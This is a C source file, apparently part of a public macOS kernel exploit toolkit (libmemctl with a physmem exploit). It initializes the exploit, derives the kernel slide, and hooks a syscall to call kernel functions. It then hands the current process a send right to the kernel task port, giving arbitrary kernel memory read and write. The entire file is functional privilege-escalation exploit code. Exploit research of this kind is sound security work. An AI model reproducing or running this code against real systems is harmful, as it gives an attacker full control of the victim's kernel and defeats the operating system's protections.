/*
 * core.c
 * Brandon Azad
 *
 * Implementation of libmemctl's core_load.
 */
#include "fail.h"
#include "kernel_image.h"
#include "kernel_slide.h"
#include "physmem.h"

#include "memctl/core.h"
#include "memctl/kernel.h"
#include "memctl/x86_64/kernel_call_syscall_x86_64.h"

#include <stdarg.h>
#include <stdio.h>

static kernel_io_result kernel_read_text_(kaddr_t kaddr, size_t *size, void *data,
		size_t access_width, kaddr_t *next);

static kernel_io_result kernel_write_text_(kaddr_t kaddr, size_t *size, const void *data,
		size_t access_width, kaddr_t *next);

bool core_load() {
	// Initialize the kernel subsystem so we can resolve symbols. Because we do this before we
	// know the kernel_slide, the addresses resolved will not be slid until we re-initialize
	// with the correct kernel_slide.
	if (!kernel_init(NULL)) {
		return false;
	}
	// Initialize the exploit.
	physmem_init();
	probe_kernel_slide();
	// Re-initialize libmemctl's kernel subsystem.
	kernel_init(NULL);
	// Our kernel text read/write functions should now work. Initialize libmemctl's kernel call
	// functionality on x86_64.
	kernel_read_text = kernel_read_text_;
	kernel_write_text = kernel_write_text_;
	if (!kernel_call_init_syscall_x86_64()) {
		return false;
	}
	// Resolve symbols.
	kaddr_t _kernel_task           = kernel_sym("_kernel_task");
	kaddr_t _task_reference        = kernel_sym("_task_reference");
	kaddr_t _convert_task_to_port  = kernel_sym("_convert_task_to_port");
	kaddr_t _get_task_ipcspace     = kernel_sym("_get_task_ipcspace");
	kaddr_t _current_task          = kernel_sym("_current_task");
	kaddr_t _ipc_port_copyout_send = kernel_sym("_ipc_port_copyout_send");
	// Get the kernel task pointer.
	kaddr_t kernel_task_ptr = kern_read(_kernel_task, sizeof(kaddr_t));
	// Get the IPC space for the current task.
	kaddr_t current_task = syscall_kernel_call_x86_64(_current_task, 0, 0, 0, 0, 0);
	kaddr_t space = syscall_kernel_call_x86_64(_get_task_ipcspace, current_task, 0, 0, 0, 0);
	// Create a send right for the kernel task.
	syscall_kernel_call_x86_64(_task_reference, kernel_task_ptr, 0, 0, 0, 0);
	kaddr_t send_right = syscall_kernel_call_x86_64(_convert_task_to_port, kernel_task_ptr, 0, 0, 0, 0);
	// Add the send right to the current task.
	kernel_task = syscall_kernel_call_x86_64(_ipc_port_copyout_send, send_right, space, 0, 0, 0);
	if (kernel_task == MACH_PORT_NULL) {
		FAIL("could not get send right to kernel task");
	}
	// Clean up.
	kernel_call_deinit_syscall_x86_64();
	physmem_deinit();
	return true;
}

// On failure, just exit. This simplifies the code, since we don't need to handle error
// propagation.
void noreturn fail(const char *format, ...) {
	static bool recursive = false;
	va_list ap;
	va_start(ap, format);
	vfprintf(stderr, format, ap);
	va_end(ap);
	// Uninstall the syscall hook if this isn't a recursive failure.
	if (!recursive) {
		recursive = true;
		kernel_call_deinit_syscall_x86_64();
	}
	exit(1);
}

static kernel_io_result kernel_read_text_(kaddr_t kaddr, size_t *size, void *data,
		size_t access_width, kaddr_t *next) {
	uint8_t *p = (uint8_t *)data;
	size_t left = *size;
	while (left > 0) {
		if (left < sizeof(kword_t)) {
			p     += left - sizeof(kword_t);
			kaddr += left - sizeof(kword_t);
			left   = sizeof(kword_t);
		}
		*(kword_t *)p = kern_read(kaddr, sizeof(kword_t));
		p     += sizeof(kword_t);
		kaddr += sizeof(kword_t);
		left  -= sizeof(kword_t);
	}
	return KERNEL_IO_SUCCESS;
}

static kernel_io_result kernel_write_text_(kaddr_t kaddr, size_t *size, const void *data,
		size_t access_width, kaddr_t *next) {
	const uint8_t *p = (const uint8_t *)data;
	size_t left = *size;
	while (left > 0) {
		if (left < sizeof(kword_t)) {
			p     += left - sizeof(kword_t);
			kaddr += left - sizeof(kword_t);
			left   = sizeof(kword_t);
		}
		kern_write(kaddr, *(const kword_t *)p, sizeof(kword_t));
		p     += sizeof(kword_t);
		kaddr += sizeof(kword_t);
		left  -= sizeof(kword_t);
	}
	return KERNEL_IO_SUCCESS;
}
